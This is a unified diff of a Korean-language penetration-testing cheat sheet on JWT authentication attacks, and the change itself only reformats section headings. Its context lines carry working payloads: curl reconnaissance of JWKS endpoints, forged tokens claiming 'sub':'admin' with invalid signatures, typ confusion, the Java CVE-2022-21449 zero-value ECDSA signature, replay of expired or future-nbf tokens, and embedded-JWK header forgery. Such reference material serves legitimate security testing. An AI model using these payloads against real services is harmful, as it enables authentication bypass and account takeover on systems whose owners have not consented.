@@ -1,6 +1,6 @@
 ### 정찰 페이로드
 
-**JWKS endpoint 발견 (RS256→HS256 confusion 사전 단계):**
+#### JWKS endpoint 발견 (RS256→HS256 confusion 사전 단계)
 ```
 curl -s "https://target/.well-known/jwks.json" | jq .
 curl -s "https://target/jwks" -o jwks.json
@@ -9,7 +9,7 @@ curl -s "https://target/oauth2/jwks" | jq .
 curl -s "https://target/api/auth/jwks" | jq .
 ```
 
-**JWT 토큰 캡처 + 헤더 분석:**
+#### JWT 토큰 캡처 + 헤더 분석
 ```bash
 # 헤더 디코드
 echo "<TOKEN>" | cut -d. -f1 | base64 -d 2>/dev/null | jq .
@@ -19,7 +19,7 @@ echo "<TOKEN>" | cut -d. -f1 | base64 -d 2>/dev/null | jq .
 echo "<TOKEN>" | cut -d. -f2 | base64 -d 2>/dev/null | jq .
 ```
 
-**알고리즘/kid 종류 enumeration:**
+#### 알고리즘/kid 종류 enumeration
 - 헤더에서 `alg` 확인 (HS256/RS256/ES256/none)
 - `kid` 값 형식 확인 (UUID/path/SQL 인젝션 가능 형태)
 - `jku`/`jwk` 헤더 사용 여부 확인 (외부 키 신뢰)
@@ -103,20 +103,20 @@ PAYLOAD=$(echo -n '{"sub":"admin"}' | base64 -w0 | tr -d '=' | tr '/+' '_-')
 curl "https://target/api/profile" -H "Authorization: Bearer $HEADER.$PAYLOAD.invalidsig"
 ```
 
-**`typ` 혼동 (RFC 9068):**
+#### `typ` 혼동 (RFC 9068)
 ```
 HEADER='{"alg":"RS256","typ":"JWT"}'  # ID token → access token 용도 재사용
 HEADER='{"alg":"RS256","typ":"at+jwt"}'  # access token으로 위장
 ```
 
-**Java Psychic Signature (CVE-2022-21449):**
+#### Java Psychic Signature (CVE-2022-21449)
 ```
 # Java 15-18 ECDSA 검증 환경
 # r=0, s=0 서명 (DER encoded "MAYCAQACAQA=" 같은 값)
 # 토큰의 ECDSA signature를 이 값으로
 ```
 
-**만료 토큰 / nbf 미래:**
+#### 만료 토큰 / nbf 미래
 ```
 # exp 만료된 토큰 그대로 사용
 curl "https://target/api/protected" -H "Authorization: Bearer EXPIRED_JWT"
@@ -125,7 +125,7 @@ curl "https://target/api/protected" -H "Authorization: Bearer EXPIRED_JWT"
 PAYLOAD='{"sub":"admin","nbf":2000000000,"iat":2000000000}'
 ```
 
-**Embedded JWK 헤더:**
+#### Embedded JWK 헤더
 ```
 # 토큰 헤더에 공개키 직접 포함 — 누구나 유효 토큰 생성
 HEADER='{"alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}'
